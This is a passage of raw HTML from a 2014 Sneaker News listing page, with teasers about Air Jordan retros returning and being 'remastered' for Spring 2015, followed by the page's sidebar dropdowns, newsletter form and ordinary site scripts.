                                                        <a href="https://twitter.com/share" class="twitter-share-button external" data-count="horizontal" data-url="http://sneakernews.com/2014/06/06/air-jordan-retros-confirmed-spring-2015/" data-text="Air Jordan Retros Confirmed For Spring 2015" data-via="sneakernews" target="_blank">Tweet</a>														
                                                    </div>
                                                </div>
                                                <!--twitter-->
                                                <div class="google social_box">
                                                    <div class="like_box">
                                                        <div class="g-plusone"  data-callback="googlePlusCallback" data-size="medium" data-href="http://sneakernews.com/2014/06/06/air-jordan-retros-confirmed-spring-2015/"></div>
                                                    </div>	
                                                </div>
                                                <div class="pinterest social_box">
                                                    <div class="like_box ">
                                                            <a href="//www.pinterest.com/pin/create/button/?url=http://sneakernews.com/2014/06/06/air-jordan-retros-confirmed-spring-2015/&#038;media=http://sneakernews.com/wp-content/uploads/2014/06/air-jordans-spring-2015.jpg" data-pin-do="buttonPin" data-pin-zero="true" data-pin-config="beside" class="external" target="_blank"><img src="//assets.pinterest.com/images/pidgets/pinit_fg_en_rect_gray_20.png" /></a>
                                                        </div>
                                                </div>
                                            </div>

                                            <div class="shares-like">
                                                <strong>1072</strong> <span>shares / likes</span>
                                            </div>
                                        </div>
                                    </div>

                                    <div class="post-data">
                                                                                    <p><a href="http://sneakernews.com/2014/06/06/air-jordan-retros-confirmed-spring-2015/"><img src="http://cdn.sneakernews.com/wp-content/uploads/2014/06/air-jordans-spring-2015.jpg" alt=""></a></p>
                                            <p>
We recently learned of a brand new initiative by Jordan Brand in which the label will move forward with &#8220;remastering&#8221; its Retro footwear beginning Spring 2015. To put it sh...<a class="read-more" href="http://sneakernews.com/2014/06/06/air-jordan-retros-confirmed-spring-2015/">Read More</a></p>
                                        
                                                                            </div>

                                </div>
                            </div>
                        </section>
                        <!--small-->

                                                 

						                                                <!--small-->

                        <section class="sneaker-post-main ">
                            <div class="sneaker-small-post">
                                <div class="small-post-data">
                                    <div class="post-header">
                                        <h2 class="header-title"><a href="http://sneakernews.com/2014/06/06/air-jordan-retros-remastered-beginning-spring-2015/">
                                                                                                <span>Air Jordan Retros To Be &#8220;Remastered&#8221; Beginning Spring 2015</span></a></h2>
                                        <div class="date-and-name">
                                            <p><span>June 6, 2014 BY <a class="url fn n" href="http://sneakernews.com/author/bdunne/" title="View all posts by Brendan Dunne" rel="author">Brendan Dunne</a>  /</span>
											<b class="comment">
											49 </b>
                                             <b class="rating">4.5 /  5</b></p>
                                        </div>
                                        <div class="social-shares">
                                            <div class="soc-icon">
                                                <div class="facebook social_box">
                                                    <div class="like_box">
                                                        <div class="fb-like" data-href="http://sneakernews.com/2014/06/06/air-jordan-retros-remastered-beginning-spring-2015/" data-layout="button_count" data-action="like" data-show-faces="false" data-share="false"></div>
                                                    </div>
                                                </div>
                                                <!--twitter-->
                                                <div class="twitter social_box">
                                                    <div class="like_box">
                                                        <a href="https://twitter.com/share" class="twitter-share-button external" data-count="horizontal" data-url="http://sneakernews.com/2014/06/06/air-jordan-retros-remastered-beginning-spring-2015/" data-text="Air Jordan Retros To Be &#8220;Remastered&#8221; Beginning Spring 2015" data-via="sneakernews" target="_blank">Tweet</a>														
                                                    </div>
                                                </div>
                                                <!--twitter-->
                                                <div class="google social_box">
                                                    <div class="like_box">
                                                        <div class="g-plusone"  data-callback="googlePlusCallback" data-size="medium" data-href="http://sneakernews.com/2014/06/06/air-jordan-retros-remastered-beginning-spring-2015/"></div>
                                                    </div>	
                                                </div>
                                                <div class="pinterest social_box">
                                                    <div class="like_box ">
                                                            <a href="//www.pinterest.com/pin/create/button/?url=http://sneakernews.com/2014/06/06/air-jordan-retros-remastered-beginning-spring-2015/&#038;media=http://sneakernews.com/wp-content/uploads/2014/06/air-jordan-10-red-black-grey-spring-2015-2.jpg" data-pin-do="buttonPin" data-pin-zero="true" data-pin-config="beside" class="external" target="_blank"><img src="//assets.pinterest.com/images/pidgets/pinit_fg_en_rect_gray_20.png" /></a>
                                                        </div>
                                                </div>
                                            </div>

                                            <div class="shares-like">
                                                <strong>1006</strong> <span>shares / likes</span>
                                            </div>
                                        </div>
                                    </div>

                                    <div class="post-data">
                                                                                    <p><a href="http://sneakernews.com/2014/06/06/air-jordan-retros-remastered-beginning-spring-2015/"><img src="http://cdn.sneakernews.com/wp-content/uploads/2014/06/air-jordan-10-red-black-grey-spring-2015-2.jpg" alt=""></a></p>
                                            <p>
Jordan Brand has answered the calls for higher quality Air Jordan retros with their &#8220;remastering&#8221; of the line that&#8217;s being prepped for Spring 2015. This newly unveile...<a class="read-more" href="http://sneakernews.com/2014/06/06/air-jordan-retros-remastered-beginning-spring-2015/">Read More</a></p>
                                        
                                                                            </div>

                                </div>
                            </div>
                        </section>
                        <!--small-->

                                                 

						                                                <!--small-->

                        <section class="sneaker-post-main  last-post ">
                            <div class="sneaker-small-post">
                                <div class="small-post-data">
                                    <div class="post-header">
                                        <h2 class="header-title"><a href="http://sneakernews.com/2014/06/04/air-jordan-4-columbia-retro-returning-2015/">
                                                                                                <span>Air Jordan 4 &#8220;Columbia&#8221; Retro Returning in 2015</span></a></h2>
                                        <div class="date-and-name">
                                            <p><span>June 4, 2014 BY <a class="url fn n" href="http://sneakernews.com/author/johnkimx83/" title="View all posts by John Kim" rel="author">John Kim</a>  /</span>
											<b class="comment">
											96</b>
                                             <b class="rating">3.39 /  5</b></p>
                                        </div>
                                        <div class="social-shares">
                                            <div class="soc-icon">
                                                <div class="facebook social_box">
                                                    <div class="like_box">
                                                        <div class="fb-like" data-href="http://sneakernews.com/2014/06/04/air-jordan-4-columbia-retro-returning-2015/" data-layout="button_count" data-action="like" data-show-faces="false" data-share="false"></div>
                                                    </div>
                                                </div>
                                                <!--twitter-->
                                                <div class="twitter social_box">
                                                    <div class="like_box">
                                                        <a href="https://twitter.com/share" class="twitter-share-button external" data-count="horizontal" data-url="http://sneakernews.com/2014/06/04/air-jordan-4-columbia-retro-returning-2015/" data-text="Air Jordan 4 &#8220;Columbia&#8221; Retro Returning in 2015" data-via="sneakernews" target="_blank">Tweet</a>														
                                                    </div>
                                                </div>
                                                <!--twitter-->
                                                <div class="google social_box">
                                                    <div class="like_box">
                                                        <div class="g-plusone"  data-callback="googlePlusCallback" data-size="medium" data-href="http://sneakernews.com/2014/06/04/air-jordan-4-columbia-retro-returning-2015/"></div>
                                                    </div>	
                                                </div>
                                                <div class="pinterest social_box">
                                                    <div class="like_box ">
                                                            <a href="//www.pinterest.com/pin/create/button/?url=http://sneakernews.com/2014/06/04/air-jordan-4-columbia-retro-returning-2015/&#038;media=http://sneakernews.com/wp-content/uploads/2014/06/jordan-4-columbia-retro.jpg" data-pin-do="buttonPin" data-pin-zero="true" data-pin-config="beside" class="external" target="_blank"><img src="//assets.pinterest.com/images/pidgets/pinit_fg_en_rect_gray_20.png" /></a>
                                                        </div>
                                                </div>
                                            </div>

                                            <div class="shares-like">
                                                <strong>1645</strong> <span>shares / likes</span>
                                            </div>
                                        </div>
                                    </div>

                                    <div class="post-data">
                                                                                    <p><a href="http://sneakernews.com/2014/06/04/air-jordan-4-columbia-retro-returning-2015/"><img src="http://cdn.sneakernews.com/wp-content/uploads/2014/06/jordan-4-columbia-retro.jpg" alt=""></a></p>
                                            <p>
Earlier today, we gave you info regarding the return of the Air Jordan 4 &#8220;Oreo&#8221; for 2015. Turns out, another 1999 Retro release is coming back as well &#8211; the &#8220;Co...<a class="read-more" href="http://sneakernews.com/2014/06/04/air-jordan-4-columbia-retro-returning-2015/">Read More</a></p>
                                        
                                                                            </div>

                                </div>
                            </div>
                        </section>
                        <!--small-->

                                                 

						                
            </div>
            <!-- left-main -->
            <!--side-bar-->
<div class="right-main">
     <section class="right-data-con omc-right" id="omc-sidebar">
        <ul class="xoxo">
			<!-- cmnUNT | Begin ad tag -->
			<script type="text/javascript">cmnUNT('300x250', tile_num++);</script> 
			<!-- cmnUNT | End ad tag -->
			<br><br>
		

		<!--<li class="instagram omc-widget">
			
						
			<header class="hero">
				<h2><span class="logo"></span></h2>
				<a href="http://instagram.com/sneakernews" target="_blank" class="external"><span>@</span>sneakernews</a>
				<h2><span> Followers</span></h2>
			</header>
			
						
		</li>-->		   
		</ul><!-- /xoxo -->
    </section>

    <section class="right-data-con">
        <div class="follow-us-box">
            <h3><span>follow us:</span></h3>

            <ul class="social-link">
                <li><a class="facebook" href="https://www.facebook.com/sneakernews"></a></li>                <li><a class="instagram" href="http://instagram.com/sneakernews"></a></li>                <li><a class="twitter" href="https://twitter.com/sneakernews/"></a></li>                <li><a class="pinterest" href="http://pinterest.com/sneakernews/"></a></li>                <li><a class="google" href="https://plus.google.com/+sneakernews/about"></a></li>            </ul>
            <div class="fb-like" data-href="https://www.facebook.com/sneakernews" data-layout="standard" data-action="like" data-show-faces="false" data-share="false" width="300px"></div>
        </div>
    </section>

    <section class="right-data-con top-categories">
        <!-- AVH Extended Categories version 3.6.7 | http://blog.avirtualhome.com/wordpress-plugins/ --><h3><span>Top Categories</span></h3><ul><div id='cat-drop'><select name='cat' id='cat' class='postform' >
	<option value='-1'>Select Category</option>
	<option class="level-0" value="24">Adidas&nbsp;&nbsp;(4,205)</option>
	<option class="level-0" value="20">Air Classic BW&nbsp;&nbsp;(208)</option>
	<option class="level-0" value="12">Air Jordan&nbsp;&nbsp;(10,480)</option>
	<option class="level-0" value="206">Air Jordan Force Fusion&nbsp;&nbsp;(235)</option>
	<option class="level-0" value="15">Air Max 1&nbsp;&nbsp;(1,194)</option>
	<option class="level-0" value="9">Air Max 360&nbsp;&nbsp;(86)</option>
	<option class="level-0" value="6">Air Max 90&nbsp;&nbsp;(1,260)</option>
	<option class="level-0" value="19">Air Max 95&nbsp;&nbsp;(525)</option>
	<option class="level-0" value="47">Air Max 97&nbsp;&nbsp;(172)</option>
	<option class="level-0" value="57">Air Max Light&nbsp;&nbsp;(150)</option>
	<option class="level-0" value="41">Air Stab&nbsp;&nbsp;(31)</option>
	<option class="level-0" value="68">Air Structure&nbsp;&nbsp;(79)</option>
	<option class="level-0" value="273">Air Yeezy&nbsp;&nbsp;(325)</option>
	<option class="level-0" value="44">Alife&nbsp;&nbsp;(108)</option>
	<option class="level-0" value="39">Asia Exclusive&nbsp;&nbsp;(495)</option>
	<option class="level-0" value="42">Asics&nbsp;&nbsp;(835)</option>
	<option class="level-0" value="27">Bape&nbsp;&nbsp;(85)</option>
	<option class="level-0" value="21">Basketball&nbsp;&nbsp;(8,058)</option>
	<option class="level-0" value="4">Blazer&nbsp;&nbsp;(959)</option>
	<option class="level-0" value="272">Celebrity Feet&nbsp;&nbsp;(1,864)</option>
	<option class="level-0" value="16">Clothing&nbsp;&nbsp;(350)</option>
	<option class="level-0" value="43">Collaboration&nbsp;&nbsp;(6,518)</option>
	<option class="level-0" value="271">Collections&nbsp;&nbsp;(226)</option>
	<option class="level-0" value="70">Converse&nbsp;&nbsp;(1,043)</option>
	<option class="level-0" value="25">Court Force&nbsp;&nbsp;(104)</option>
	<option class="level-0" value="285">Customs&nbsp;&nbsp;(1,281)</option>
	<option class="level-0" value="61">DC Shoes&nbsp;&nbsp;(67)</option>
	<option class="level-0" value="3">Dope Kicks&nbsp;&nbsp;(68)</option>
	<option class="level-0" value="11">Dunk&nbsp;&nbsp;(2,765)</option>
	<option class="level-0" value="283">Dwyane Wade&nbsp;&nbsp;(466)</option>
	<option class="level-0" value="205">eBay&nbsp;&nbsp;(2,867)</option>
	<option class="level-0" value="64">Europe Exclusive&nbsp;&nbsp;(343)</option>
	<option class="level-0" value="270">Events&nbsp;&nbsp;(1,071)</option>
	<option class="level-0" value="4625">Featured&nbsp;&nbsp;(2,420)</option>
	<option class="level-0" value="7337">Featured Stories&nbsp;&nbsp;(290)</option>
	<option class="level-0" value="50">Finishline&nbsp;&nbsp;(360)</option>
	<option class="level-0" value="48">Footscape&nbsp;&nbsp;(169)</option>
	<option class="level-0" value="35">Gear&nbsp;&nbsp;(138)</option>
	<option class="level-0" value="284">Giveaway&nbsp;&nbsp;(42)</option>
	<option class="level-0" value="287">Griffey&nbsp;&nbsp;(209)</option>
	<option class="level-0" value="207">House of Hoops&nbsp;&nbsp;(301)</option>
	<option class="level-0" value="34">Hybrid&nbsp;&nbsp;(1,360)</option>
	<option class="level-0" value="73">Hyperdunk&nbsp;&nbsp;(736)</option>
	<option class="level-0" value="29">Japanese Brands&nbsp;&nbsp;(537)</option>
	<option class="level-0" value="204">JD Sports&nbsp;&nbsp;(243)</option>
	<option class="level-0" value="1">Just Released&nbsp;&nbsp;(13,804)</option>
	<option class="level-0" value="282">Kevin Durant&nbsp;&nbsp;(1,450)</option>
	<option class="level-0" value="52">Kids&nbsp;&nbsp;(608)</option>
	<option class="level-0" value="209">Kobe&nbsp;&nbsp;(2,089)</option>
	<option class="level-0" value="1282">Kyrie Irving&nbsp;&nbsp;(30)</option>
	<option class="level-0" value="22">LeBron&nbsp;&nbsp;(3,326)</option>
	<option class="level-0" value="217">Lifestyle Sneakers&nbsp;&nbsp;(2,992)</option>
	<option class="level-0" value="28">New Balance&nbsp;&nbsp;(1,450)</option>
	<option class="level-0" value="63">Nike 6.0&nbsp;&nbsp;(114)</option>
	<option class="level-0" value="71">Nike ACG&nbsp;&nbsp;(493)</option>
	<option class="level-0" value="7">Nike Air Force 1s&nbsp;&nbsp;(2,914)</option>
	<option class="level-0" value="5">Nike Air Max&nbsp;&nbsp;(5,028)</option>
	<option class="level-0" value="288">Nike Air Penny&nbsp;&nbsp;(680)</option>
	<option class="level-0" value="90">Nike Boots&nbsp;&nbsp;(253)</option>
	<option class="level-0" value="3101">Nike Flyknit&nbsp;&nbsp;(428)</option>
	<option class="level-0" value="280">Nike Foamposite&nbsp;&nbsp;(1,339)</option>
	<option class="level-0" value="51">Nike Force&nbsp;&nbsp;(138)</option>
	<option class="level-0" value="208">Nike Free&nbsp;&nbsp;(815)</option>
	<option class="level-0" value="6974">Nike Huarache&nbsp;&nbsp;(352)</option>
	<option class="level-0" value="40">Nike iD&nbsp;&nbsp;(944)</option>
	<option class="level-0" value="286">Nike Lunar&nbsp;&nbsp;(1,111)</option>
	<option class="level-0" value="58">Nike Retro&nbsp;&nbsp;(3,529)</option>
	<option class="level-0" value="5781">Nike Roshe&nbsp;&nbsp;(503)</option>
	<option class="level-0" value="10">Nike SB&nbsp;&nbsp;(2,841)</option>
	<option class="level-0" value="36">NikeStore&nbsp;&nbsp;(717)</option>
	<option class="level-0" value="56">P-Rod&nbsp;&nbsp;(290)</option>
	<option class="level-0" value="23">PE&nbsp;&nbsp;(2,478)</option>
	<option class="level-0" value="31">Promo&nbsp;&nbsp;(682)</option>
	<option class="level-0" value="62">Puma&nbsp;&nbsp;(646)</option>
	<option class="level-0" value="49">Reebok&nbsp;&nbsp;(2,006)</option>
	<option class="level-0" value="6300">Release Dates&nbsp;&nbsp;(715)</option>
	<option class="level-0" value="38">Running&nbsp;&nbsp;(3,637)</option>
	<option class="level-0" value="8">Sample&nbsp;&nbsp;(1,637)</option>
	<option class="level-0" value="535">Saucony&nbsp;&nbsp;(283)</option>
	<option class="level-0" value="6021">Select&nbsp;&nbsp;(106)</option>
	<option class="level-0" value="30">Shoes&nbsp;&nbsp;(63)</option>
	<option class="level-0" value="69">Skate&nbsp;&nbsp;(3,235)</option>
	<option class="level-0" value="162">Supra&nbsp;&nbsp;(537)</option>
	<option class="level-0" value="215">Terminator&nbsp;&nbsp;(143)</option>
	<option class="level-0" value="4132">Top Categories&nbsp;&nbsp;(1)</option>
	<option class="level-0" value="14">Toys&nbsp;&nbsp;(39)</option>
	<option class="level-0" value="33">Trainer&nbsp;&nbsp;(1,547)</option>
	<option class="level-0" value="66">Upcoming Sneakers&nbsp;&nbsp;(23,149)</option>
	<option class="level-0" value="53">Vandal&nbsp;&nbsp;(104)</option>
	<option class="level-0" value="32">Vans&nbsp;&nbsp;(1,459)</option>
	<option class="level-0" value="37">Vintage&nbsp;&nbsp;(573)</option>
	<option class="level-0" value="82">Visvim&nbsp;&nbsp;(40)</option>
	<option class="level-0" value="279">Weekly Rewind&nbsp;&nbsp;(264)</option>
	<option class="level-0" value="26">WMNS&nbsp;&nbsp;(1,602)</option>
</select>
<script type='text/javascript'>
/* <![CDATA[ */
            var ec_dropdown_top_2 = document.getElementById("cat");
            function ec_top_onCatChange_2() {
                if ( ec_dropdown_top_2.options[ec_dropdown_top_2.selectedIndex].value > 0 ) {
                    location.href = "http://sneakernews.com/?cat="+ec_dropdown_top_2.options[ec_dropdown_top_2.selectedIndex].value;
                }
            }
            ec_dropdown_top_2.onchange = ec_top_onCatChange_2;
/* ]]> */
</script>
</div>	<li class="cat-item cat-item-1"><a href="http://sneakernews.com/category/just-released/" >Just Released</a>
</li>
	<li class="cat-item cat-item-5"><a href="http://sneakernews.com/category/air-max/" >Nike Air Max</a>
</li>
	<li class="cat-item cat-item-7"><a href="http://sneakernews.com/category/air-force-1/" >Nike Air Force 1s</a>
</li>
	<li class="cat-item cat-item-10"><a href="http://sneakernews.com/category/nike-sb/" >Nike SB</a>
</li>
	<li class="cat-item cat-item-11"><a href="http://sneakernews.com/category/dunk/" >Dunk</a>
</li>
	<li class="cat-item cat-item-12"><a href="http://sneakernews.com/category/air-jordan/" >Air Jordan</a>
</li>
	<li class="cat-item cat-item-21"><a href="http://sneakernews.com/category/basketball/" >Basketball</a>
</li>
	<li class="cat-item cat-item-22"><a href="http://sneakernews.com/category/lebron/" >LeBron</a>
</li>
	<li class="cat-item cat-item-24"><a href="http://sneakernews.com/category/adidas/" >Adidas</a>
</li>
	<li class="cat-item cat-item-38"><a href="http://sneakernews.com/category/running/" >Running</a>
</li>
	<li class="cat-item cat-item-43"><a href="http://sneakernews.com/category/collaboration/" >Collaboration</a>
</li>
	<li class="cat-item cat-item-58"><a href="http://sneakernews.com/category/nike-retro/" >Nike Retro</a>
</li>
	<li class="cat-item cat-item-66"><a href="http://sneakernews.com/category/upcoming-sneakers/" >Upcoming Sneakers</a>
</li>
	<li class="cat-item cat-item-69"><a href="http://sneakernews.com/category/skate/" >Skate</a>
</li>
	<li class="cat-item cat-item-205"><a href="http://sneakernews.com/category/ebay/" >eBay</a>
</li>
	<li class="cat-item cat-item-217"><a href="http://sneakernews.com/category/lifestyle-sneakers/" >Lifestyle Sneakers</a>
</li>
</ul>    </section>

    <section class="right-data-con">
        <h3><span>Archives</span></h3><div class="cat-drop">		<select name="archive-dropdown" onchange='document.location.href=this.options[this.selectedIndex].value;'>
			<option value="">Select Month</option>

				<option value='http://sneakernews.com/2015/01/'> January 2015 </option>
	<option value='http://sneakernews.com/2014/12/'> December 2014 </option>
	<option value='http://sneakernews.com/2014/11/'> November 2014 </option>
	<option value='http://sneakernews.com/2014/10/'> October 2014 </option>
	<option value='http://sneakernews.com/2014/09/'> September 2014 </option>
	<option value='http://sneakernews.com/2014/08/'> August 2014 </option>
	<option value='http://sneakernews.com/2014/07/'> July 2014 </option>
	<option value='http://sneakernews.com/2014/06/'> June 2014 </option>
	<option value='http://sneakernews.com/2014/05/'> May 2014 </option>
	<option value='http://sneakernews.com/2014/04/'> April 2014 </option>
	<option value='http://sneakernews.com/2014/03/'> March 2014 </option>
	<option value='http://sneakernews.com/2014/02/'> February 2014 </option>
	<option value='http://sneakernews.com/2014/01/'> January 2014 </option>
	<option value='http://sneakernews.com/2013/12/'> December 2013 </option>
	<option value='http://sneakernews.com/2013/11/'> November 2013 </option>
	<option value='http://sneakernews.com/2013/10/'> October 2013 </option>
	<option value='http://sneakernews.com/2013/09/'> September 2013 </option>
	<option value='http://sneakernews.com/2013/08/'> August 2013 </option>
	<option value='http://sneakernews.com/2013/07/'> July 2013 </option>
	<option value='http://sneakernews.com/2013/06/'> June 2013 </option>
	<option value='http://sneakernews.com/2013/05/'> May 2013 </option>
	<option value='http://sneakernews.com/2013/04/'> April 2013 </option>
	<option value='http://sneakernews.com/2013/03/'> March 2013 </option>
	<option value='http://sneakernews.com/2013/02/'> February 2013 </option>
	<option value='http://sneakernews.com/2013/01/'> January 2013 </option>
	<option value='http://sneakernews.com/2012/12/'> December 2012 </option>
	<option value='http://sneakernews.com/2012/11/'> November 2012 </option>
	<option value='http://sneakernews.com/2012/10/'> October 2012 </option>
	<option value='http://sneakernews.com/2012/09/'> September 2012 </option>
	<option value='http://sneakernews.com/2012/08/'> August 2012 </option>
	<option value='http://sneakernews.com/2012/07/'> July 2012 </option>
	<option value='http://sneakernews.com/2012/06/'> June 2012 </option>
	<option value='http://sneakernews.com/2012/05/'> May 2012 </option>
	<option value='http://sneakernews.com/2012/04/'> April 2012 </option>
	<option value='http://sneakernews.com/2012/03/'> March 2012 </option>
	<option value='http://sneakernews.com/2012/02/'> February 2012 </option>
	<option value='http://sneakernews.com/2012/01/'> January 2012 </option>
	<option value='http://sneakernews.com/2011/12/'> December 2011 </option>
	<option value='http://sneakernews.com/2011/11/'> November 2011 </option>
	<option value='http://sneakernews.com/2011/10/'> October 2011 </option>
	<option value='http://sneakernews.com/2011/09/'> September 2011 </option>
	<option value='http://sneakernews.com/2011/08/'> August 2011 </option>
	<option value='http://sneakernews.com/2011/07/'> July 2011 </option>
	<option value='http://sneakernews.com/2011/06/'> June 2011 </option>
	<option value='http://sneakernews.com/2011/05/'> May 2011 </option>
	<option value='http://sneakernews.com/2011/04/'> April 2011 </option>
	<option value='http://sneakernews.com/2011/03/'> March 2011 </option>
	<option value='http://sneakernews.com/2011/02/'> February 2011 </option>
	<option value='http://sneakernews.com/2011/01/'> January 2011 </option>
	<option value='http://sneakernews.com/2010/12/'> December 2010 </option>
	<option value='http://sneakernews.com/2010/11/'> November 2010 </option>
	<option value='http://sneakernews.com/2010/10/'> October 2010 </option>
	<option value='http://sneakernews.com/2010/09/'> September 2010 </option>
	<option value='http://sneakernews.com/2010/08/'> August 2010 </option>
	<option value='http://sneakernews.com/2010/07/'> July 2010 </option>
	<option value='http://sneakernews.com/2010/06/'> June 2010 </option>
	<option value='http://sneakernews.com/2010/05/'> May 2010 </option>
	<option value='http://sneakernews.com/2010/04/'> April 2010 </option>
	<option value='http://sneakernews.com/2010/03/'> March 2010 </option>
	<option value='http://sneakernews.com/2010/02/'> February 2010 </option>
	<option value='http://sneakernews.com/2010/01/'> January 2010 </option>
	<option value='http://sneakernews.com/2009/12/'> December 2009 </option>
	<option value='http://sneakernews.com/2009/11/'> November 2009 </option>
	<option value='http://sneakernews.com/2009/10/'> October 2009 </option>
	<option value='http://sneakernews.com/2009/09/'> September 2009 </option>
	<option value='http://sneakernews.com/2009/08/'> August 2009 </option>
	<option value='http://sneakernews.com/2009/07/'> July 2009 </option>
	<option value='http://sneakernews.com/2009/06/'> June 2009 </option>
	<option value='http://sneakernews.com/2009/05/'> May 2009 </option>
	<option value='http://sneakernews.com/2009/04/'> April 2009 </option>
	<option value='http://sneakernews.com/2009/03/'> March 2009 </option>
	<option value='http://sneakernews.com/2009/02/'> February 2009 </option>
	<option value='http://sneakernews.com/2009/01/'> January 2009 </option>
	<option value='http://sneakernews.com/2008/12/'> December 2008 </option>
	<option value='http://sneakernews.com/2008/11/'> November 2008 </option>
	<option value='http://sneakernews.com/2008/10/'> October 2008 </option>
	<option value='http://sneakernews.com/2008/09/'> September 2008 </option>
	<option value='http://sneakernews.com/2008/08/'> August 2008 </option>
	<option value='http://sneakernews.com/2008/07/'> July 2008 </option>
	<option value='http://sneakernews.com/2008/06/'> June 2008 </option>
	<option value='http://sneakernews.com/2008/05/'> May 2008 </option>
	<option value='http://sneakernews.com/2008/04/'> April 2008 </option>
	<option value='http://sneakernews.com/2008/03/'> March 2008 </option>
	<option value='http://sneakernews.com/2008/02/'> February 2008 </option>
	<option value='http://sneakernews.com/2008/01/'> January 2008 </option>
	<option value='http://sneakernews.com/2007/12/'> December 2007 </option>
	<option value='http://sneakernews.com/2007/11/'> November 2007 </option>
	<option value='http://sneakernews.com/2007/10/'> October 2007 </option>
	<option value='http://sneakernews.com/2007/09/'> September 2007 </option>
	<option value='http://sneakernews.com/2007/08/'> August 2007 </option>
	<option value='http://sneakernews.com/2007/07/'> July 2007 </option>
	<option value='http://sneakernews.com/2007/06/'> June 2007 </option>
	<option value='http://sneakernews.com/2007/05/'> May 2007 </option>
	<option value='http://sneakernews.com/2007/04/'> April 2007 </option>
	<option value='http://sneakernews.com/2007/03/'> March 2007 </option>
	<option value='http://sneakernews.com/2007/02/'> February 2007 </option>
	<option value='http://sneakernews.com/2007/01/'> January 2007 </option>
	<option value='http://sneakernews.com/2006/12/'> December 2006 </option>
		</select>
</div>    </section>

    <section class="right-data-con featured-content">
        <h3><span>Featured Content</span></h3>			<div class="textwidget"><div class="featured-content-sidebar">


<a href="http://sneakernews.com/air-jordan-brand-jordan/"><img src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/snkrnws_banner_historyaj.jpg"></a>
<br>

<a href="http://sneakernews.com/nike-sb-skateboarding/"><img src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/snkrnws_banner_nikesbarchive.jpg"></a>
<br>

<a href="http://sneakernews.com/magazine/"><img src="http://cdn.sneakernews.com/wp-content/uploads/2014/11/SNMAG-300x250.jpg"></a>
</div><br>



</div>
		    </section>

    <section class="right-data-con news-letter">
        <h3><span>Sneaker News Newsletter</span></h3>			<div class="textwidget"><div class="e-mail">
	        <form method="post" target="_blank" action="http://visitor.r20.constantcontact.com/d.jsp" name="ccoptin">
				<input class="newslatterclass" type="text" name="ea" size="35" value="Enter Email To Sign Up" onBlur="if(this.value=='') this.value='Enter Email To Sign Up'" onFocus="if(this.value =='Enter Email To Sign Up' ) this.value=''">
				<input type="submit" class="submit" value="Sign Up" name="signup">
				<input type="hidden" value="dcdlvybab" name="llr">
				<input type="hidden" value="1101413059651" name="m">
				<input type="hidden" value="oi" name="p">
			</form>                     	
		</div></div>
		    </section>

</div>            <!--side-bar-->

            <div class="sneaker-footer-post">
			                <!-- footer-post-main -->
            </div>
            <!-- sneaker-footer-post -->
        </div>
        <!-- sneaker-con-main -->

    </div><!--wrapper-->
</div>
<!--container-->

</div>
<!-- end cmn_wrap -->
<footer id="colophon" role="contentinfo">
    <div class="wrapper">
        <div class="footer-main">
            <div class="footer-left">
                <div class="footer-top">
                    <a class="footerlogo" href="http://sneakernews.com"><img src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/sneakernews-logo-one-line.png " alt="Sneaker News" /></a>
                    <ul class="social-link">
                        <li><a class="facebook" href="https://www.facebook.com/sneakernews"></a></li>                        <li><a class="instagram" href="http://instagram.com/sneakernews"></a></li>                        <li><a class="twitter" href="https://twitter.com/sneakernews/"></a></li><li><a class="pinterest" href="http://pinterest.com/sneakernews/"></a></li><li><a class="google" href="https://plus.google.com/+sneakernews/about"></a></li>                    </ul>
                </div>
                <div class="footer-text">
                    <p>
                    © 2006-2014 Liquidrice, Inc. | Sneaker News is a Liquidrice, Inc. Company</p>
                </div>
            </div>
            <div class="footer-right">
                <ul class="footer-menu">
<div class="menu-footer-menu-container"><li id="menu-item-550283" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-550283"><a href="http://sneakernews.com/about/">About Us</a></li>
<li id="menu-item-550284" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550284"><a href="http://sneakernews.com/jobs/">career</a></li>
<li id="menu-item-550285" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550285"><a href="http://sneakernews.com/advertise/">advertise</a></li>
<li id="menu-item-550286" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-550286"><a href="http://sneakernews.com/about/#sneaker-news-staff">staff</a></li>
<li id="menu-item-550287" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-550287"><a href="http://sneakernews.com/contact/">Contact</a></li>
</div>                </ul>
            </div>

            <div class="footer-for-mobile">
                <div class="mob-soc-icon">
                    <ul class="social-link">
                        <li><a class="facebook" href="https://www.facebook.com/sneakernews"></a></li><li><a class="instagram" href="http://instagram.com/sneakernews"></a></li>                                                                                <li><a class="twitter" href="https://twitter.com/sneakernews/"></a></li>                                                                                <li><a class="pinterest" href="http://pinterest.com/sneakernews/"></a></li>                                                                                <li><a class="google" href="https://plus.google.com/+sneakernews/about"></a></li>                    </ul>
                    <a class="footerlogo" href="http://sneakernews.com"><img src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/sneakernews-logo-one-line.png " alt="Sneaker News" /></a>
                    <p><span>© 2006-2014 Liquidrice, Inc. | Sneaker News is a Liquidrice, Inc. Company</span></p>
                </div>
            </div>

        </div>
    </div>
</footer><!-- #colophon -->
</div><!--main-->

<script type="text/javascript">
	function add_digit_share_counts(get_page_url, social_call) {
        var formData = {page_url: get_page_url};        
        var my_url = "http://sneakernews.com/wp-content/themes/sneakernews/share_count_api.php";
        $.ajax({
            type: 'POST',
            url: my_url,
            data: formData,
            success: function(share_count_data) {
                //$(this).find('#shares-like strong').text(share_count_data);
               // alert(1);
            }
        });
    }
    var _rys = jQuery.noConflict();
    var margin_top = _rys("#sneaker-news-main nav ul").height();
    var top_div_hight = _rys("#sneaker-news-main .logo-main").height();
	var add_dynamic_hight = _rys("#cmn_ad_tag_head").height();
    _rys("document").ready(function() {
        var browsername = $.browser.mozilla;
        _rys(window).scroll(function() {
            add_dynamic_hight = _rys("#cmn_ad_tag_head").height();
			margin_top = _rys("#sneaker-news-main nav ul").height();			
            top_div_hight = _rys("#sneaker-news-main .logo-main").height() + add_dynamic_hight;

            if (_rys(this).scrollTop() > top_div_hight) {
                _rys('.sneaker-nav').addClass("blue-nav");
                _rys('#sneaker-news-main .sub-nav-main').css('margin-top', margin_top);

            } else {
                _rys('.sneaker-nav').removeClass("blue-nav");
                _rys('#sneaker-news-main .sub-nav-main').css('margin-top', 0);
            }

            if (browsername == true) {
                if (_rys(this).scrollTop() > 600) {
